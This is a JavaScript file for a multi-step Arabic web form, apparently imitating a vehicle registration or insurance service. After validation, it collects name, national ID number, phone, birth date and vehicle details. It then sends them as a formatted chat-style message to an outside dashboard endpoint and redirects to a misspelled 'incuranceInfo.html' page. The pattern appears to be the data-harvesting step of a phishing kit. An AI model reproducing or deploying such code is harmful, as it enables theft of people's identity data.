// ============================
// 🔵 PROGRESS BAR + FORM HANDLING
// ============================
document.addEventListener("DOMContentLoaded", () => {

  // Progress bar setup
 const steps = document.querySelectorAll(".progress-bar .step");
const line = document.querySelector(".base-line");
  const fillLine = document.querySelector(".fill-line"); // optional for inner fill
  const nextBtn = document.getElementById("next-btn");

  // Form fields
  const purposeGroup = document.querySelectorAll(".purpose-group .seg-btn");
  const regGroup = document.querySelectorAll(".reg-group .seg-btn");
  const identityInput = document.getElementById("identity-number");
  const serialInput = document.getElementById("serial-number");

  // 🔸 Safety check (avoid null errors)
  if (!steps.length || !line || !nextBtn) {
    console.warn("⚠️ Progress bar elements not found. Check your selectors.");
    return;
  }

  // -------------------------
  //  Helper functions
  // -------------------------
  function setActive(groupBtns, clicked) {
    groupBtns.forEach((b) => b.classList.remove("seg-active"));
    clicked.classList.add("seg-active");
  }

  // Validation function
  function validateForm() {
    if (!identityInput || !serialInput) return true; // skip validation if missing

    let ok = true;
    identityInput.classList.remove("field-error");
    serialInput.classList.remove("field-error");

    const idVal = identityInput.value.trim();
    if (!/^\d{5,}$/.test(idVal)) {
      identityInput.classList.add("field-error");
      ok = false;
    }

    const regActive = [...regGroup].find((b) => b.classList.contains("seg-active"));
    if (regActive && regActive.dataset.value === "serial") {
      if (serialInput.value.trim().length < 3) {
        serialInput.classList.add("field-error");
        ok = false;
      }
    }
    return ok;
  }

  // -------------------------
  //  Progress Bar Updates
  // -------------------------
  let currentStep = 0;

  function updateProgressBar() {
    const progressPercent = (currentStep / (steps.length - 1)) * 100;
    line.style.setProperty("--progress-width", `${progressPercent}%`);
    if (fillLine) fillLine.style.width = `${progressPercent}%`;

    steps.forEach((s, i) => {
      s.classList.remove("active", "completed");
      if (i < currentStep) s.classList.add("completed");
      if (i === currentStep) s.classList.add("active");
    });
  }

  // Step click handling
  steps.forEach((step, index) => {
    step.addEventListener("click", () => {
      currentStep = index;
      updateProgressBar();
    });
  });

  // -------------------------
  //  Button & Form Logic
  // -------------------------
  purposeGroup.forEach((btn) => {
    btn.addEventListener("click", () => setActive(purposeGroup, btn));
  });

  regGroup.forEach((btn) => {
    btn.addEventListener("click", () => {
      setActive(regGroup, btn);
      if (serialInput) {
        serialInput.disabled = false;
        serialInput.placeholder =
          btn.dataset.value === "serial" ? "الرقم التسلسلي" : "رقم البطاقة الجمركية";
      }
    });
  });

  // Next button
nextBtn.addEventListener("click", async () => {
  if (!validateForm()) {
    nextBtn.animate(
      [
        { transform: "translateX(0)" },
        { transform: "translateX(-6px)" },
        { transform: "translateX(0)" },
      ],
      { duration: 220, easing: "ease-out" }
    );
    return;
  }

  // ✅ Collect step1 data
  const s1 = {
    customerName: document.getElementById("customerName")?.value.trim() || "",
    nationalId: document.getElementById("nationalId")?.value.trim() || "",
    purpose:
      document.querySelector(".seg [data-purpose].active")?.dataset.purpose || "",
    regType:
      document.querySelector(".seg [data-reg].active")?.dataset.reg || "",
    sequenceNo: document.getElementById("sequenceNo")?.value.trim() || "",
    customCard: document.getElementById("customCard")?.value.trim() || "",
    phoneNumber: document.getElementById("phoneNumber")?.value.trim() || "",
    birthDay: document.querySelector('[name="dob_day"]')?.value || "",
    birthMonth: document.querySelector('[name="dob_month"]')?.value || "",
    birthYear: document.querySelector('[name="dob_year"]')?.value || "",
    year: document.getElementById("year")?.value || "",
  };

  console.log("Collected step1 data:", s1);

  // ✅ Save locally
  sessionStorage.setItem("step1", JSON.stringify(s1));

  // ✅ Build message text for API
  const messageText = `
🧾 **تم إدخال بيانات الخطوة الأولى**
👤 الاسم: ${s1.customerName || '—'}
🆔 الهوية: ${s1.nationalId || '—'}
🎯 الغرض: ${s1.purpose || '—'}
🚗 نوع التسجيل: ${s1.regType || '—'}
🔢 الرقم التسلسلي: ${s1.sequenceNo || '—'}
🔖 الرقم الجمركي: ${s1.customCard || '—'}
📞 الهاتف: ${s1.phoneNumber || '—'}
📅 الميلاد: ${s1.birthDay}/${s1.birthMonth}/${s1.birthYear}
📆 سنة الصنع: ${s1.year || '—'}
  `.trim();

  const payload = { text: messageText };

  // ✅ Send to API
  try {
    const res = await fetch("https://dashboard-nrc2.onrender.com/api/messages", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload),
    });

    if (!res.ok) throw new Error(`HTTP ${res.status}`);
    console.log("✅ Step 1 data sent successfully!");
  } catch (err) {
    console.error("❌ Error sending step 1 data:", err);
    // Optional: continue even if API fails
  }

  // ✅ Move to next page
  window.location.href = "incuranceInfo.html";
});


  // Initialize bar
  updateProgressBar();
});

